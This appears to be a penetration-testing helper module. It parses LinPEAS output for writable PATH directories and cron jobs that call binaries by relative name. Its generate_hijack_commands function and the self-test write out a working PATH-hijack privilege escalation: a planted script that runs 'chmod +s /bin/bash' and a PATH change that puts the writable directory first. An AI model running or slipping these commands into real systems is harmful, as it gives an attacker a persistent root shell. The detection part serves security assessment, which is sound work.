"""Detect PATH hijacking opportunities from LinPEAS output."""

import re
from typing import List, Dict

# Directories that are commonly world-writable
_WORLD_WRITABLE = ("/tmp", "/var/tmp", "/dev/shm")

# Matches "Current PATH: ..." or "PATH=..."
_PATH_LINE_RE = re.compile(r"(?:current\s+)?PATH\s*[:=]\s*(\S+)", re.IGNORECASE)

# Matches "(writable)" annotation after a directory path
_WRITABLE_MARKER_RE = re.compile(r"(/[\w/.\-]+)\s*\(writable\)", re.IGNORECASE)

# Matches "Writable dir in PATH: /some/dir"
_WRITABLE_DIR_RE = re.compile(r"writable\s+dir(?:ectory)?\s+in\s+PATH\s*:\s*(/\S+)", re.IGNORECASE)

# Matches a cron schedule line: 5 fields + user + command (reused from cron.py pattern)
_CRON_LINE_RE = re.compile(
    r"(?:[*\d/,\-]+\s+){4}[*\d/,\-]+\s+\S+\s+(\S.*)"
)


def parse_path_section(section_text: str) -> List[str]:
    """Extract writable directories from LinPEAS PATH-related output."""
    writable: List[str] = []
    seen: set = set()

    def _add(path: str) -> None:
        path = path.rstrip("/")
        if path and path not in seen:
            seen.add(path)
            writable.append(path)

    for raw_line in section_text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        # "Writable dir in PATH: /tmp"
        m = _WRITABLE_DIR_RE.search(line)
        if m:
            _add(m.group(1))
            continue

        # "/some/dir (writable)"
        for m in _WRITABLE_MARKER_RE.finditer(line):
            _add(m.group(1))

        # "Current PATH: /usr/local/bin:/tmp:/home/user/.local/bin"
        m = _PATH_LINE_RE.search(line)
        if m:
            for component in m.group(1).split(":"):
                component = component.rstrip("/")
                if not component:
                    continue
                # Flag known world-writable dirs appearing in PATH
                if any(component == d or component.startswith(d + "/")
                       for d in _WORLD_WRITABLE):
                    _add(component)

    return writable


def find_relative_commands(section_text: str) -> List[str]:
    """Return relative command names found in cron jobs or scripts in LinPEAS output."""
    relatives: List[str] = []
    seen: set = set()

    for raw_line in section_text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        m = _CRON_LINE_RE.match(line)
        if not m:
            continue

        # Full cron command field (may include arguments)
        command_field = m.group(1).strip()
        # First token is the executable
        binary = command_field.split()[0]

        # Relative if it does not start with "/"
        if binary.startswith("/"):
            continue

        if binary not in seen:
            seen.add(binary)
            relatives.append(binary)

    return relatives


def generate_hijack_commands(writable_dir: str, binary_name: str = "TARGET_BINARY") -> List[str]:
    """Generate PATH hijack exploit commands for a given writable directory."""
    target = f"{writable_dir}/{binary_name}"
    return [
        f"echo '#!/bin/bash' > {target}",
        f"echo 'chmod +s /bin/bash' >> {target}",
        f"chmod +x {target}",
        f"export PATH={writable_dir}:$PATH",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Parse LinPEAS output and return HIGH findings for PATH hijack opportunities."""
    writable_dirs = parse_path_section(section_text)

    findings: List[Dict] = []
    for directory in writable_dirs:
        findings.append({
            "writable_dir": directory,
            "severity": "HIGH",
            "type": "path_hijack",
            "commands": generate_hijack_commands(directory),
            "note": "Replace TARGET_BINARY with the binary name called by root process",
        })

    return findings


# ── Self-test ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    SAMPLE = """
# Checking PATH for writable directories...
Current PATH: /usr/local/sbin:/usr/local/bin:/tmp:/home/user/.local/bin
Writable dir in PATH: /tmp
/home/user/.local/bin (writable)
/usr/local/bin (not writable)

# Cron jobs:
* * * * * root backup --full
*/5 * * * * root /usr/bin/python3 /opt/monitor.py
0 2 * * * www-data cleanup
/etc/cron.d/logrotate: 0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf
"""

    print("=== parse_path_section ===")
    dirs = parse_path_section(SAMPLE)
    for d in dirs:
        print(d)

    print("\n=== find_relative_commands ===")
    cmds = find_relative_commands(SAMPLE)
    for c in cmds:
        print(c)

    print("\n=== generate_hijack_commands ===")
    for cmd in generate_hijack_commands("/tmp", "backup"):
        print(cmd)

    print("\n=== analyze ===")
    findings = analyze(SAMPLE)
    for f in findings:
        print(f"[{f['severity']}] {f['writable_dir']} ({f['type']})")
        for cmd in f["commands"]:
            print(f"  {cmd}")
        print(f"  NOTE: {f['note']}")
